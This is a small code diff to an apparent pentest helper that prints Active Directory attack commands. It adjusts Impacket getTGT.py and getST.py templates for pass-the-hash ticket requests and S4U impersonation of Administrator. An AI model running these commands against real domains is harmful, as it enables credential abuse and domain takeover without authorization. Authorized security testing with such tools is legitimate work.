@@ -49,7 +49,7 @@ def print_warning(s):
     print(f'{Fore.RED}# WARNING: {s}{Style.RESET_ALL}')
 
 
-def TGTRequest(glob:dict, parent:Owned):
+def TGTRequest(glob:dict, parent:Owned, nopass=False):
     if parent.krb_auth:
         return
 
@@ -63,6 +63,8 @@ def TGTRequest(glob:dict, parent:Owned):
         cmd = "getTGT.py '{fqdn}/{parent.obj.name}' -dc-ip {dc_ip} -hashes :{parent.secret}"
     elif parent.secret_type == c.SECRET_PASSWORD:
         cmd = "getTGT.py '{fqdn}/{parent.obj.name}:{parent.secret}' -dc-ip {dc_ip}"
+        if nopass:
+            cmd += ' -no-pass'
 
     print_line(comment, cmd, v, end=False)
     print_cmd("export KRB5CCNAME='{parent.obj.name}.ccache'", v)
@@ -147,7 +149,7 @@ def GetSTImpersonate(glob:dict, parent:Owned, target:LDAPObject, do_u2u:bool):
     comment = 'Ask a TGS on {target.name} and impersonate it to Administrator (S4U2Self + S4U2Proxy)'
 
     if parent.krb_auth:
-        cmd = "getST.py '{fqdn}/{parent.obj.name}' -no-pass -dc-ip {dc_ip} -impersonate Administrator -spn 'HOST/{target_no_dollar}'{do_u2u}"
+        cmd = "getST.py '{fqdn}/{parent.obj.name}' -k -no-pass -dc-ip {dc_ip} -impersonate Administrator -spn 'HOST/{target_no_dollar}'{do_u2u}"
     elif parent.secret_type == c.SECRET_NTHASH:
         cmd = "getST.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -dc-ip {dc_ip} -impersonate Administrator -spn 'HOST/{target_no_dollar}'{do_u2u}"
     elif parent.secret_type == c.SECRET_AESKEY:
